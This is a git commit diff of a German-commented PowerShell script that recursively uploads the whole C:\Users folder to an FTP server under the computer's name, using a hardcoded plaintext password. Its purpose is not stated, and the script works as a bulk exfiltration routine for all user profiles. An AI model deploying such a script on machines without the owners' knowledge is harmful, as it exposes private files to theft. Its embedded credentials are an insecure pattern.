8481c14c4c643d27d26453153450f16c2d966dae
fiveraptor <jorisbieg@gmail.com>
2023-06-13 21:46:20 +0200

    updated ftp

--- ftp_upload.ps1
+++ ftp_upload.ps1
@@ -5,8 +5,40 @@ $ftpPassword = "yxc_2023"
 $localFolder = "C:\Users"
 $remoteFolder = $env:COMPUTERNAME
 
-# Alternative Methode zur Ermittlung des Computername
-#$remoteFolder = (Get-WmiObject Win32_ComputerSystem).Name
+# Funktion zum rekursiven Hochladen von Dateien und Ordnern
+function RecursiveUpload($path, $ftpPath) {
+    # Liste alle Dateien und Unterverzeichnisse im angegebenen Pfad auf
+    $files = Get-ChildItem -Path $path
+
+    # Schleife über alle Dateien und Unterverzeichnisse
+    foreach ($file in $files) {
+        # Erstelle den Remote-Pfad basierend auf dem FTP-Pfad
+        $relativePath = $file.FullName.Substring($path.Length + 1)
+        $remotePath = "$ftpPath/$relativePath"
+
+        # Überprüfe, ob es sich um ein Verzeichnis handelt
+        if ($file.PSIsContainer) {
+            # Erstelle das Verzeichnis auf dem FTP-Server
+            $ftpRequest = [System.Net.FtpWebRequest]::Create($remotePath)
+            $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::MakeDirectory
+            $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
+            $ftpResponse = $ftpRequest.GetResponse()
+
+            # Rufe die Funktion rekursiv für das Unterverzeichnis auf
+            RecursiveUpload $file.FullName $remotePath
+        } else {
+            # Lade die Datei auf den FTP-Server hoch
+            $ftpRequest = [System.Net.FtpWebRequest]::Create($remotePath)
+            $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+            $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
+            $ftpStream = $ftpRequest.GetRequestStream()
+            $fileStream = [System.IO.File]::OpenRead($file.FullName)
+            $fileStream.CopyTo($ftpStream)
+            $fileStream.Close()
+            $ftpStream.Close()
+        }
+    }
+}
 
 # Erstelle eine WebRequest-Instanz für die FTP-Verbindung
 $ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://$ftpServer/$remoteFolder")
@@ -14,33 +46,5 @@ $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::MakeDirectory
 $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
 $ftpResponse = $ftpRequest.GetResponse()
 
-# Liste alle Dateien und Unterverzeichnisse im lokalen Ordner auf
-$files = Get-ChildItem -Path $localFolder -Recurse
-
-# Schleife über alle Dateien und Unterverzeichnisse
-foreach ($file in $files) {
-    # Erstelle den Remote-Pfad basierend auf dem lokalen Pfad
-    $relativePath = $file.FullName.Substring($localFolder.Length + 1)
-    $remotePath = "ftp://$ftpServer/$remoteFolder/$relativePath"
-
-    # Überprüfe, ob es sich um ein Verzeichnis handelt
-    if ($file.PSIsContainer) {
-        # Erstelle das Verzeichnis auf dem FTP-Server
-        $ftpRequest = [System.Net.FtpWebRequest]::Create($remotePath)
-        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::MakeDirectory
-        $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
-        $ftpResponse = $ftpRequest.GetResponse()
-    } else {
-        # Lade die Datei auf den FTP-Server hoch
-        $ftpRequest = [System.Net.FtpWebRequest]::Create($remotePath)
-        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
-        $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
-        $ftpStream = $ftpRequest.GetRequestStream()
-        $fileStream = [System.IO.File]::OpenRead($file.FullName)
-        $fileStream.CopyTo($ftpStream)
-        $fileStream.Close()
-        $ftpStream.Close()
-    }
-}
-
-
+# Rufe die Funktion für den Hauptordner auf, um den Uploadvorgang zu starten
+RecursiveUpload $localFolder "ftp://$ftpServer/$remoteFolder"
